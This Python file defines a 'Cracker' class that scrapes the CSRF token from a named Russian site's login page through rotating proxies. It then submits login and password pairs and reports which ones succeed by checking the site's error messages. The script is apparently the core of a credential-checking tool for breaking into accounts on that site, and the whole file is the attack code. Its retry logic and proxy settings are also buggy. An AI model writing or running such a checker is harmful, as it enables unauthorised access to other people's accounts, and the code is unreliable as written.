from requests import session
from requests import exceptions
import time
import re


class Cracker:

    def session_get(self,proxy):
        r = session()
        prox = proxy.pop()
        try:
            data = r.get('https://shadowservants.ru/login',proxies={'http': "http://"+prox},timeout=5).text
            reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />',data)
            if len(str(reg)) < 3:
                time.sleep(1)
                session_get(proxy)
            csrf = str(reg).split()[2]
            csrf = csrf.split('"')
            csrf = csrf[1].replace('"','')
            self.auth(r,csrf,prox)
        except exceptions.Timeout as e:
                print(str(e))
                self.session_get()
    def auth(self,r,csrf,prox):
        login = input('Enter login: ')
        password = input('Enter password: ')
        repl = r.post(url='https://shadowservants.ru/login',data={'login':login,'password':password, 'csrf_token':csrf},headers={"referer": "https://shadowservants.ru/login"},proxies={'http': "http://"+prox}, timeout=5)
        if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
            print("Good one!")
        else:
            print('Bad one!')
